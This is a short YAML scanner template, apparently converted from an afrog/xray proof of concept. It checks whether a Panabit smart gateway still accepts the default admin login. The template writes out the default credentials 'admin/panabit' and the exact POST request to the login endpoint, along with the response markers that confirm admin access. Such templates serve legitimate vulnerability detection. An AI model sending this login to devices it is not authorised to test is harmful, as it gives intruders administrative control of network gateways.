# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: username=admin&password=panabit
    matchers:
      - type: word
        part: body
        words:
          - URL=/index.htm
        case-insensitive: true
        condition: and
      - type: word
        part: header
        words:
          - paonline_admin
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/login/userverify.cgi'
id: panabit-gateway-default-password
info:
  author: Print1n
  description: app="Panabit-智能网关"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: Panabit Gateway Default Password
  severity: high
  tags: panabit,defaultpassword,argus-import
